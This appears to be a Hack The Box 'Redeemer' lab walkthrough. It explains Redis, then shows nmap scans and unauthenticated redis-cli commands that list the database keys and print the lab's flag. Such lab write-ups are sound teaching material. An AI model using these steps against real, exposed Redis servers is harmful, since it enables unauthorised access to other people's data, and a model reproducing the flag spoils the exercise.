This box is about "redis".

**[Redis](https://redis.io/docs/getting-started/)** is an open source, in-memory data structure store, used as a database, cache, and message broker.

In-memory databases are the ones that rely essentially on the primary memory for data storage (meaning that the database is managed in the RAM of the system); in contrast to databases that store data on the disk or SSDs.

Because it's very fast, In-memory databases are typically used to cache data that is frequently requested for quick retrieval. 
For example, if there is a website that returns some prices on the front page of the site. The
website may be written to first check if the needed prices are in Redis, and if not, then check the traditional
database (like MySQL or MongoDB).

### Scan
No result for ```nmap -sC -sV <ip>```, so scan all ports.

```shell
┌──(kali㉿kali)-[~/htb/redeemer]
└─$ nmap -p1-65535 10.129.206.216
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 11:00 EDT
Nmap scan report for 10.129.206.216
Host is up (0.015s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
6379/tcp open  redis
```

```shell
┌──(kali㉿kali)-[~/htb/redeemer]
└─$ nmap -sC -sV -p 6379 10.129.206.216
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 11:01 EDT
Nmap scan report for 10.129.206.216
Host is up (0.016s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

### Interact with redis

Get more info about the redis server.
```shell
┌──(kali㉿kali)-[~/htb/redeemer]
└─$ sudo apt install redis-tools
...
┌──(kali㉿kali)-[~/htb/redeemer]
└─$ redis-cli -h 10.129.206.216
10.129.206.216:6379> info
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Obtain all the keys in the database.
```shell
┌──(kali㉿kali)-[~/htb/redeemer]
└─$ redis-cli -h 10.129.206.216 select 0 keys *
1) "numb"
2) "flag"
3) "temp"
4) "stor"
┌──(kali㉿kali)-[~/htb/redeemer]
└─$ redis-cli -h 10.129.206.216 get "flag" 
"03e1d2b376c37ab3f5319922053953eb"
```